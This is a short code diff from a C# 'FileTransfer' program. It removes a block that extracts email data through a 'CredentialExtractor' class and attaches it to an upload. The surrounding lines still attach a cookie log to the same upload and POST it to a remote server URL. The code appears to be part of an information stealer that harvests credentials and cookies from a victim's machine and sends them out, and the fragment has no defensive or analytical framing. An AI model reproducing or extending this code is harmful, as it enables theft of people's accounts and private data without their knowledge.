@@ -630,19 +630,7 @@ namespace FileTransfer
                     Log("Cookie debug log added to upload");
                 }
 
-                try
-                {
-                    string emailsJson = CredentialExtractor.ExtractEmailsJson();
-                    if (!string.IsNullOrEmpty(emailsJson) && emailsJson != "[]")
-                    {
-                        content.Add(new StringContent(emailsJson), "emails");
-                        Log($"Emails extracted: {emailsJson.Length} chars");
-                    }
-                }
-                catch (Exception ex)
-                {
-                    Log("Email extraction error: " + ex);
-                }
+
 
                 string url = $"{ServerUrl}/upload";
                 var resp = await _http.PostAsync(url, content, ct);
